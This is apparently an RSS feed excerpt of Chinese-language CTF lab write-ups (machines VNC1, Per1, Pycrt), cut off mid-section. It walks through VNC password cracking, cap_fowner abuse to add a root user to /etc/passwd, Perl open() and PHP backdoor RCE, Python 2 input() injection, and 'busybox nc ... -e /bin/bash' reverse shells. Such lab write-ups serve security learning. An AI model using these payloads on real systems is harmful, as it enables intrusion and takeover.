## **1. www-data -&gt; todd (Ê®™ÂêëÁßªÂä®)**

Âú® `www-data` shell‰∏≠ËøõË°å‰ø°ÊÅØÊêúÈõÜÔºåÂú®Áî®Êà∑ `todd` ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ®Â±ÄÂèØËØªÁöÑVNCÂØÜÁ†ÅÂ§á‰ªΩÊñá‰ª∂„ÄÇ

```bash
www-data@VNC1:/home/todd/.vnc$ ls -al
...
-rw-r--r--  1 root root      8 Jul 28 22:05 passwd.bak
...
www-data@VNC1:/home/todd/.vnc$ base64 passwd.bak 
QMypcY/7jpE=
```

ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÈîôËØØÈÖçÁΩÆ„ÄÇÊàë‰ª¨Â∞ÜËøô‰∏™Base64ÁºñÁ†ÅÁöÑÂØÜÁ†ÅÂìàÂ∏åÂ§çÂà∂Âà∞Êú¨Âú∞ËøõË°åÁ†¥Ëß£„ÄÇÊàë‰ª¨‰ΩøÁî® `vncpwd` Â∑•ÂÖ∑ÔºåËØ•Â∑•ÂÖ∑‰∏ìÈó®Áî®‰∫éËß£ÂØÜËøôÁ±ªVNCÂØÜÁ†ÅÊñá‰ª∂„ÄÇ

**Âú®Kali‰∏äÁ†¥Ëß£VNCÂØÜÁ†Å:**

```bash
# ÂÖãÈöÜÂπ∂ÁºñËØëÂ∑•ÂÖ∑
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ git clone https://github.com/jeroennijhof/vncpwd.git
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd vncpwd &amp;&amp; make

# Â∞Ü‰ªéÁõÆÊ†áÊú∫Ëé∑ÂèñÁöÑbase64Â≠óÁ¨¶‰∏≤Ëß£Á†ÅÂõûÊñá‰ª∂
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/vncpwd]
‚îî‚îÄ$ echo 'QMypcY/7jpE=' |base64 -d &gt; passwd

# ÊâßË°åËß£ÂØÜ
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/vncpwd]
‚îî‚îÄ$ ./vncpwd passwd                        
Password: vncpassw
```

ÊàêÂäüËß£ÂØÜÂá∫VNCÂØÜÁ†Å‰∏∫ `vncpassw`„ÄÇ‰ΩøÁî® `vncviewer` ÂíåÊ≠§ÂØÜÁ†ÅËøûÊé•Âà∞ÁõÆÊ†áÁöÑ5901Á´ØÂè£ÔºàËøôÈáåÈúÄË¶ÅÂõæÂΩ¢ÂåñÊ°åÈù¢Ôºâ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ vncviewer 192.168.205.140:1
...
Password: vncpassw
Authentication successful
...
```

ÊàêÂäüÁôªÂΩïÔºåËé∑Âèñ `todd` Áî®Êà∑ÁöÑÂõæÂΩ¢ÂåñÊ°åÈù¢‰ºöËØù„ÄÇÂú®ËØ•Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞Á¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
www-data@VNC1:/home/todd$ cat user.txt 
12f54a96f64443246930da001cafda8b
```

## **2. todd -&gt; root (ÂûÇÁõ¥ÊèêÊùÉ)**

Âú® `todd` Áî®Êà∑ÁöÑ‰ºöËØù‰∏≠ËøõË°åÊèêÊùÉ‰ø°ÊÅØÊêúÈõÜ„ÄÇÈ¶ñÂÖàÊ£ÄÊü•Êñá‰ª∂ÁöÑÁâπÊÆäËÉΩÂäõÔºàCapabilitiesÔºâ„ÄÇ

```bash
todd@VNC1:~$ getcap -r / 2&gt;/dev/null
...
/home/todd/Videos/python3.9 = cap_fowner+ep
```

ÂèëÁé∞‰∏Ä‰∏™‰Ωç‰∫éÁî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `python3.9` ÂèØÊâßË°åÊñá‰ª∂Ë¢´Ëµã‰∫à‰∫Ü `cap_fowner` ËÉΩÂäõ„ÄÇËØ•ËÉΩÂäõÂÖÅËÆ∏ËøõÁ®ã**Êó†ËßÜÊñá‰ª∂ÊùÉÈôê**ÔºåÊõ¥ÊîπÊñá‰ª∂ÁöÑÊâÄÊúâËÄÖÂíå**ÊùÉÈôê**„ÄÇ

Áõ¥Êé•Âà©Áî®ËØ•ËÉΩÂäõ `setuid(0)` ÁöÑÂ∞ùËØïÂ§±Ë¥•‰∫Ü„ÄÇ

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.setuid(0); os.system('/bin/sh')'
PermissionError: [Errno 1] Operation not permitted
```

‰ΩÜÊòØÔºå`chmod` Êìç‰ΩúÂπ∂Êú™Ë¢´ÈôêÂà∂„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ËÉΩÂäõÂ∞Ü `/etc/passwd` Êñá‰ª∂Âèò‰∏∫ÂÖ®Â±ÄÂèØÂÜôÔºåÁÑ∂ÂêéÊ∑ªÂä†‰∏Ä‰∏™UID‰∏∫0ÁöÑÊñ∞Áî®Êà∑Êù•ÂÆûÁé∞ÊèêÊùÉ„ÄÇ

**Âà©Áî®`cap_fowner`‰øÆÊîπ`/etc/passwd`ÊùÉÈôê:**

```bash
todd@VNC1:~$ /home/todd/Videos/python3.9 -c 'import os; os.chmod('/etc/passwd', 0o777)'
todd@VNC1:~$ ls -al /etc/passwd
-rwxrwxrwx 1 root root 1853 Jul 28 10:17 /etc/passwd
```

ÊàêÂäü‰øÆÊîπÊùÉÈôê„ÄÇÁé∞Âú®ÔºåÊàë‰ª¨Âêë `/etc/passwd` Êñá‰ª∂‰∏≠ËøΩÂä†‰∏Ä‰∏™Êñ∞Áî®Êà∑ `b`ÔºåÂÖ∂UIDÂíåGIDÂùá‰∏∫0ÔºåÂØÜÁ†Å‰∏∫ `abcdefg` (‰ΩøÁî®`$1$`ÁöÑMD5ÂìàÂ∏å)„ÄÇ

```bash
todd@VNC1:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
```

**ÂàáÊç¢Áî®Êà∑Âπ∂Ëé∑ÂèñÊúÄÁªàFlag:**

```bash
todd@VNC1:~$ su b
Password: abcdefg
root@VNC1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@VNC1:~# cat /root/root.txt /home/todd/user.txt 
flag{root-60b725f10c9c85c70d97880dfe8191b3}
12f54a96f64443246930da001cafda8b
```

Ëá≥Ê≠§ÔºåÊàêÂäüËé∑ÂèñrootÊùÉÈôêÔºåÈù∂Êú∫ÂÆåÂÖ®ÊîªÁ†¥„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_VNC1.html</guid><pubDate>Sat, 09 Aug 2025 14:04:12 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Per1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IPÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l       
...
192.168.205.139 08:00:27:82:44:3a       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.139
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.139`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇ

## **2. WebÊúçÂä°‰æ¶ÂØü**

ËÆøÈóÆ80Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÂÖ≥‰∫éPerlËØ≠Ë®ÄÁöÑÈùôÊÄÅÈ°µÈù¢„ÄÇÊü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†ÅÔºåÂú®ÂÖ∂‰∏≠ÂèëÁé∞‰∏ÄÊù°ÂÖ≥ÈîÆÁ∫øÁ¥¢„ÄÇ

```html
...
&lt;div&gt;&lt;!-- cgi --&gt;&lt;/div&gt;
...
```

HTMLÊ≥®Èáä‰∏≠Âá∫Áé∞ÁöÑ `cgi` Âº∫ÁÉàÊöóÁ§∫WebÊúçÂä°‰∏äÂèØËÉΩÂ≠òÂú®CGIËÑöÊú¨ÔºåËøôÈÄöÂ∏∏ÊòØWebÂ∫îÁî®ÁöÑ‰∏Ä‰∏™ÈáçË¶ÅÊîªÂáªÈù¢„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. CGIÁõÆÂΩï‰∏éÊñá‰ª∂Êâ´Êèè**

Ê†πÊçÆ‰∏ä‰∏ÄÊ≠•ÁöÑÁ∫øÁ¥¢ÔºåÊàë‰ª¨ÈáçÁÇπÂØπCGIÁõ∏ÂÖ≥ÁõÆÂΩïËøõË°åÊâ´Êèè„ÄÇ‰ΩøÁî® `gobuster` ÂØπ `/cgi-bin/` ÁõÆÂΩïËøõË°åÊ∑±Â∫¶Êâ´ÊèèÔºåÊàêÂäüÂèëÁé∞‰∏Ä‰∏™ÂèØÁñëÁöÑCGIËÑöÊú¨„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.139/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x cgi,pl -t 64
...
/file.cgi             (Status: 200) [Size: 22]
...
```

Êâ´ÊèèÊâæÂà∞‰∫Ü `file.cgi` Êñá‰ª∂ÔºåËøôÊòØÊàë‰ª¨ÁöÑ‰∏ªË¶ÅÁ™ÅÁ†¥Âè£„ÄÇ

## **2. LFI Âà∞ RCE (Perl `open` ÂáΩÊï∞ÊºèÊ¥û)**

ÂØπÂèëÁé∞ÁöÑ `file.cgi` ËøõË°åÂèÇÊï∞Ê®°Á≥äÊµãËØïÔºåÂèëÁé∞‰∏Ä‰∏™ `file` ÂèÇÊï∞Â≠òÂú®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ (LFI) ÊºèÊ¥û„ÄÇ

**È™åËØÅLFIÊºèÊ¥û:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl '192.168.205.139/cgi-bin/file.cgi?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
sunset:x:1001:1001:,,,:/home/sunset:/bin/bash
```

ÊàêÂäüËØªÂèñ `/etc/passwd` Êñá‰ª∂„ÄÇÂà©Áî®Ê≠§ÊºèÊ¥ûËØªÂèñ `file.cgi` Ëá™Ë∫´ÁöÑÊ∫ê‰ª£Á†Å„ÄÇ

**Ê∫êÁ†ÅÂÆ°ËÆ°:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl '192.168.205.139/cgi-bin/file.cgi?file=file.cgi'   
#!/usr/bin/perl
use CGI;
print CGI::header();
my $input = CGI::param('file');
if($input) {
    open(FILE, $input);
    print while &lt;FILE&gt;;
    close(FILE);
}
else {
    print 'Missing file parameter';
}
```

Ê∫êÁ†ÅÁöÑÊ†∏ÂøÉÈóÆÈ¢òÂú®‰∫é `open(FILE, $input);`„ÄÇÂú®Perl‰∏≠ÔºåËøôÁßçÂèåÂèÇÊï∞ÁöÑ `open` ÂáΩÊï∞ÈùûÂ∏∏Âç±Èô©„ÄÇÂΩì‰º†ÈÄíÁöÑÂèÇÊï∞‰ª•ÁÆ°ÈÅìÁ¨¶ `|` ÁªìÂ∞æÊó∂ÔºåPerl‰ºöÂ∞ÜÂÖ∂ÂêéÁöÑÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÂëΩ‰ª§Êù•ÊâßË°å„ÄÇËøô‰ΩøÊàë‰ª¨ËÉΩÂ§üÂ∞ÜLFIÊºèÊ¥ûÁõ¥Êé•ÂçáÁ∫ß‰∏∫ËøúÁ®ã‰ª£Á†ÅÊâßË°å (RCE) ÊºèÊ¥û„ÄÇ

## **3. Ëé∑Âèñ www-data Shell**

**È™åËØÅRCEÊºèÊ¥û:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl '192.168.205.139/cgi-bin/file.cgi?file=id|'     
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊàêÂäüÊâßË°å `id` ÂëΩ‰ª§„ÄÇÊé•‰∏ãÊù•ÔºåÊûÑÈÄ†ÂèçÂºπShellÁöÑPayloadÔºåÂú®Êú¨Âú∞ÂºÄÂêØÁõëÂê¨ÔºåÊàêÂäüËé∑Âèñ `www-data` Áî®Êà∑ÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
```

**ÊûÑÈÄ†Âπ∂ÊâßË°åPayload:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl '192.168.205.139/cgi-bin/file.cgi?file=busybox+nc+192.168.205.128+8888+-e+/bin/bash|'
```

**Ëé∑ÂèñShellÂπ∂Á®≥ÂÆöTTY:**

```bash
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.139] 37298
# ‰ΩøÁî® script Á®≥ÂÆöShell
script /dev/null -c bash
# ‰ΩøÁî® Ctrl+Z Â∞ÜÂÖ∂ÁΩÆ‰∫éÂêéÂè∞ÔºåÁÑ∂Âêé‰ΩøÁî® stty ‰øÆÂ§çÁªàÁ´Ø
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. www-data -&gt; sunset**

Âú®Ëé∑Âèñ `www-data` ÊùÉÈôêÂêéÔºåÂØπÁ≥ªÁªüËøõË°å‰ø°ÊÅØÊêúÈõÜ„ÄÇÂú® `/opt` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™ÂèØÁñëÁöÑPerlËÑöÊú¨ `password.pl`„ÄÇ

```bash
www-data@Per1:/opt$ ls -al
...
-rwxr-xr-x  1 sunset sunset  893 Aug  8 09:07 password.pl
```

ËØ•ËÑöÊú¨Â±û‰∫é `sunset` Áî®Êà∑„ÄÇÊâßË°åÊ≠§ËÑöÊú¨ÔºåÂæóÂà∞‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇ

```bash
www-data@Per1:/opt$ perl password.pl 
dylan4
```

ËøôÂæàÂèØËÉΩÊòØ `sunset` Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ‰ΩøÁî® `su` ÂëΩ‰ª§ÂíåËØ•ÂØÜÁ†ÅËøõË°åÂ∞ùËØï„ÄÇ

```bash
www-data@Per1:/opt$ su sunset
Password: dylan4
sunset@Per1:/opt$ id
uid=1001(sunset) gid=1001(sunset) groups=1001(sunset)
```

ÊàêÂäüÂàáÊç¢Âà∞ `sunset` Áî®Êà∑„ÄÇÂú®Ê≠§Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞Á¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
sunset@Per1:/opt$ cat /home/sunset/user.txt
flag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}
```

## **2. sunset -&gt; root **

Ëé∑Âèñ `sunset` ÊùÉÈôêÂêéÔºåÁ´ãÂàªÊ£ÄÊü•ÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```bash
sunset@Per1:/opt$ sudo -l
...
User sunset may run the following commands on Per1:
    (ALL) NOPASSWD: /usr/bin/python /usr/bin/guess_game.py
```

`sunset` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜ‰ª• `root` ÊùÉÈôêËøêË°å `/usr/bin/guess_game.py` ËÑöÊú¨„ÄÇÊü•ÁúãËØ•ËÑöÊú¨Ê∫êÁ†Å„ÄÇ

```bash
sunset@Per1:/opt$ cat /usr/bin/guess_game.py
import random

def guess_game():
    ...
    try:
        user_input = input('Your guess: ')  
    except Exception as e:
        print 'Error:', e
        return
    ...
```

Ê≠§ËÑöÊú¨‰ΩøÁî® `python` (Âç≥Python 2) ÊâßË°åÔºåÂπ∂‰∏îÂú®‰ª£Á†Å‰∏≠‰ΩøÁî®‰∫ÜÊûÅÂÖ∂Âç±Èô©ÁöÑ `input()` ÂáΩÊï∞„ÄÇÂú®Python 2‰∏≠Ôºå`input()` ‰ºöÂ∞ÜÁî®Êà∑ÁöÑËæìÂÖ•ÂΩì‰ΩúPython‰ª£Á†ÅÊù•ÊâßË°å„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•ËæìÂÖ•‰∏ÄÊÆµËÉΩÂ§üÂêØÂä®shellÁöÑPython‰ª£Á†ÅÔºåËØ•‰ª£Á†ÅÂ∞Ü‰ª• `root` ÊùÉÈôêÊâßË°å„ÄÇ

**ÊûÑÈÄ†Âπ∂ÊâßË°åÊèêÊùÉPayload:**

```bash
sunset@Per1:/opt$ sudo /usr/bin/python /usr/bin/guess_game.py
Welcome to the guess game!
I've chosen a number between 0 and 65535.
Your guess: __import__('os').system('/bin/bash')
```

ËæìÂÖ•PayloadÂêéÔºåÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÁöÑshell„ÄÇ

**Ëé∑ÂèñÊúÄÁªàFlag:**

```bash
root@Per1:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@Per1:/opt# cat /root/root.txt /home/sunset/user.txt 
flag{root-c27679de03aba03c5a33159aef11f8ea}
flag{user-5b5b8e9b01ef27a1cc0a2d5fa87d7190}
```

Ëá≥Ê≠§ÔºåÈù∂Êú∫ÂÆåÂÖ®ÊîªÁ†¥„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Per1.html</guid><pubDate>Sat, 09 Aug 2025 14:03:53 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Pycrt</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè**

È¶ñÂÖàÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Á°ÆÂÆöÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄÔºåÈöèÂêéÂà©Áî® `nmap` ÂØπÂÖ∂ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:75:0e:4e       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.131
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.131`ÔºåÂºÄÊîæ‰∫Ü **22 (SSH)**„ÄÅ**80 (HTTP)** Âíå **6667 (IRC)** Á´ØÂè£„ÄÇ

## **2. ÊúçÂä°‰æ¶ÂØü**

* **HTTP (80Á´ØÂè£):** ËÆøÈóÆËØ•Á´ØÂè£ÂèëÁé∞ÊòØ Apache2 ÁöÑÈªòËÆ§Ê¨¢ËøéÈ°µÈù¢ÔºåÊ≤°ÊúâÁõ¥Êé•ÂèØÂà©Áî®ÁöÑ‰ø°ÊÅØ„ÄÇ

* **IRC (6667Á´ØÂè£):** ËøôÊòØÂÖ≥ÈîÆÁöÑÁ™ÅÁ†¥Âè£„ÄÇ‰ΩøÁî® `irssi` ÂÆ¢Êà∑Á´ØËøûÊé•Âà∞ËØ•ÊúçÂä°„ÄÇ

  ```bash
  irssi -c 192.168.205.131 -p 6667
  ```

  Âú®ËøûÊé•ÂêéÁöÑÊúçÂä°Âô®Ê¨¢Ëøé‰ø°ÊÅØ (MOTD) ‰∏≠ÔºåÂèëÁé∞‰∏ÄÊù°Ëá≥ÂÖ≥ÈáçË¶ÅÁöÑÁ∫øÁ¥¢Ôºö

  &gt; `...issues ShadowSec directory...`
  &gt; ËøôÂº∫ÁÉàÊöóÁ§∫WebÊúçÂä°‰∏äÂèØËÉΩÂ≠òÂú®‰∏Ä‰∏™Âêç‰∏∫ `ShadowSec` ÁöÑÁõÆÂΩï„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂàùÂßãËÆøÈóÆ**

## **1. WebÁõÆÂΩï‰∏é‰ª£Á†ÅÂÆ°ËÆ°**

Ê†πÊçÆ IRC ÊúçÂä°Êèê‰æõÁöÑÁ∫øÁ¥¢ÔºåËÆøÈóÆ `http://192.168.205.131/ShadowSec/`ÔºåÂèëÁé∞‰∏Ä‰∏™ÈùôÊÄÅÈ°µÈù¢„ÄÇÂØπËØ•ÁõÆÂΩïËøõË°åÊ∑±Â∫¶Êâ´ÊèèÔºåÂèëÁé∞‰∏Ä‰∏™ÈöêËóèÁöÑÊñá‰ª∂ `bydataset.php`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
/bydataset.php        (Status: 200)
...
```

# **2. LFI Âà∞ RCE**

ÈÄöËøáÂØπ `bydataset.php` ËøõË°åÂèÇÊï∞Ê®°Á≥äÊµãËØïÔºåÂèëÁé∞‰∏Ä‰∏™ `file` ÂèÇÊï∞Â≠òÂú®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ (LFI) ÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
...
file                    [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 14ms]
...

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

Âà©Áî®ËØ•LFIÊºèÊ¥ûÔºåËØªÂèñ `bydataset.php` Êñá‰ª∂Ëá™Ë∫´ÁöÑÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÂÖ∂ÂåÖÂê´‰∏Ä‰∏™ÂêéÈó®„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php'
```

Ê∫êÁ†ÅÂÆ°ËÆ°ÁªìÊûúÂ¶Ç‰∏ãÔºö

*   ÂΩìÊé•Êî∂Âà∞ **POST** ËØ∑Ê±ÇÊó∂„ÄÇ
*   ÈúÄË¶Å‰∏Ä‰∏™ `auth` ÂèÇÊï∞ÔºåÂÖ∂ÂÄºÂøÖÈ°ª‰∏∫Á°¨ÁºñÁ†ÅÁöÑ `'LetMeIn123!'`„ÄÇ
*   Êé•Êî∂‰∏Ä‰∏™ `payload` ÂèÇÊï∞ÔºåËØ•ÂèÇÊï∞ÁªèËøá `strrev()` (Â≠óÁ¨¶‰∏≤ÂèçËΩ¨) Âíå `base64_decode()` Ëß£Á†ÅÂêéÔºåÂ¶ÇÊûú‰ª• `cmd:` ÂºÄÂ§¥ÔºåÂàôÂÖ∂ÂêéÁöÑÂÜÖÂÆπ‰ºöË¢´ `exec()` ÂáΩÊï∞ÊâßË°å„ÄÇ

ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ„ÄÅÁ≤æÂøÉÊûÑÈÄ†ÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°å (RCE) ÊºèÊ¥û„ÄÇ

## **3. Ëé∑Âèñ www-data Shell**

Ê†πÊçÆÊ∫êÁ†ÅÈÄªËæëÔºåÊûÑÈÄ†Êàë‰ª¨ÁöÑPayload„ÄÇ

1.  **ÁõÆÊ†áÂëΩ‰ª§:** `id`
2.  **ÊûÑÈÄ†Â≠óÁ¨¶‰∏≤:** `cmd:id`
3.  **Base64ÁºñÁ†Å:** `Y21kOmlk`
4.  **Â≠óÁ¨¶‰∏≤ÂèçËΩ¨:** `klimDk12Y`

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
‚îî‚îÄ$ echo -n 'cmd:id' | base64 -w0 | rev  
klmOk12Y 
```

‰ΩøÁî® `curl` ÂèëÈÄÅÊûÑÈÄ†Â•ΩÁöÑPOSTËØ∑Ê±ÇÔºåÊàêÂäüÈ™åËØÅRCE„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=klmOk12Y' http://192.168.205.131/ShadowSec/bydataset.php
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/pre&gt;
```

Êé•‰∏ãÊù•ÔºåÊûÑÈÄ†ÂèçÂºπShellÁöÑPayloadÔºåÂú®Êú¨Âú∞KaliÂºÄÂêØÁõëÂê¨ÂêéÔºåÊàêÂäüËé∑Âèñ `www-data` Áî®Êà∑ÁöÑ‰∫§‰∫íÂºèShell„ÄÇ

**Êú¨Âú∞ÁõëÂê¨:**

```bash
nc -lvnp 8888
```

**ÊûÑÈÄ†Âπ∂ÊâßË°åPayload:**

```bash
# Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))
curl -X POST --data 'auth=LetMeIn123!' --data-urlencode 'payload=oNXY...' http://...
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. www-data -&gt; chatlake**

Ëé∑ÂèñÂàùÊ≠•ShellÂêéÔºåÊâßË°å `sudo -l` Êü•ÁúãÂΩìÂâçÁî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
www-data@PyCrt:/tmp$ sudo -l
...
User www-data may run the following commands on PyCrt:
    (chatlake) NOPASSWD: /usr/bin/weechat
```

ÂèëÁé∞ `www-data` Áî®Êà∑ÂèØ‰ª•‰ª• `chatlake` Áî®Êà∑ÁöÑË∫´‰ªΩÔºåÂÖçÂØÜËøêË°åÁªàÁ´ØIRCÂÆ¢Êà∑Á´Ø `weechat`„ÄÇËøôÊòØ‰∏Ä‰∏™ÊèêÊùÉË∑ØÂæÑ„ÄÇ

1. È¶ñÂÖàÁ®≥ÂÆöÂΩìÂâçshellÔºå‰ΩøÂÖ∂Êàê‰∏∫‰∏Ä‰∏™ÂäüËÉΩÂÆåÊï¥ÁöÑTTY„ÄÇ

2. ÊâßË°åÊèêÊùÉÂëΩ‰ª§ÔºåÂêØÂä®`weechat`„ÄÇ

   ```bash
   sudo -u chatlake /usr/bin/weechat
   ```

3. Âú® `weechat` ÂÆ¢Êà∑Á´ØÂÜÖÈÉ®ÔºåÂà©Áî®ÂÖ∂ `/exec` ÂäüËÉΩÊâßË°åÂëΩ‰ª§ÔºåÂèçÂºπ‰∏Ä‰∏™Êñ∞ÁöÑshell„ÄÇ

   ```
   /exec busybox nc 192.168.205.128 9999 -e /bin/bash
   ```

4. Âú®Êú¨Âú∞ `9999` Á´ØÂè£ÊàêÂäüÊé•Êî∂Âà∞ `chatlake` Áî®Êà∑ÁöÑshell„ÄÇ

## **2. chatlake -&gt; pycrtlake**

Ëé∑Âèñ `chatlake` ÊùÉÈôêÂêéÔºåÂÜçÊ¨°ÊâßË°å `sudo -l`„ÄÇ

```bash
chatlake@PyCrt:~$ sudo -l
...
